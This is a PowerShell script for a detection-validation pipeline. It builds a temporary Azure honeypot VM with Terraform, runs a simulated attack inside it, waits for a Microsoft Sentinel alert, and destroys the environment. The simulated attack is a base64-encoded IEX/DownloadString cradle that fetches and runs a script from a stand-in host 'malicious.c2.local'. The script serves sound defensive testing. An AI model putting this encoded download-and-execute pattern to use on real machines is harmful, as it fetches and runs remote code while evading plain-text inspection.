<#
.SYNOPSIS
Orchestrates the automated DevSecOps threat validation pipeline.
Spins up a temporary honeypot, runs an attack script, and destroys the environment.
#>

$ResourceGroup = "rg-sentinel-honeypot-temp"
$VmName = "vm-honeypot-01"

Write-Host "🚀 [Phase 1] Provisioning Temporary Honeypot Infrastructure..." -ForegroundColor Cyan
Set-Location -Path .\terraform-honeypot
terraform init
terraform apply -auto-approve
Set-Location -Path ..

Write-Host "⚔️ [Phase 2] Executing Attack Simulation (Suspicious PowerShell)..." -ForegroundColor Yellow
# Uses Azure Run Command to securely execute the attack inside the isolated VM
$AttackScript = @'
# Simulate a malicious encoded PowerShell command (Triggering T1059.001)
$maliciousPayload = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.c2.local/payload.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($maliciousPayload))
powershell.exe -EncodedCommand $encoded
'@

Set-Content -Path ".\temp_attack.ps1" -Value $AttackScript
az vm run-command invoke --command-id RunPowerShellScript --name $VmName -g $ResourceGroup --scripts "@temp_attack.ps1"
Remove-Item ".\temp_attack.ps1" -Force

Write-Host "🔍 [Phase 3] Attack executed. Polling Sentinel API for Alert verification..." -ForegroundColor Cyan
Start-Sleep -Seconds 60
# Note: Integration with the src-cli Go tool would go here to query the Sentinel Alert API and assert True.

Write-Host "🧹 [Phase 4] Tearing down Honeypot Infrastructure..." -ForegroundColor Green
Set-Location -Path .\terraform-honeypot
terraform destroy -auto-approve
Set-Location -Path ..

Write-Host "✅ Continuous Validation Complete. No rogue infrastructure remaining." -ForegroundColor Green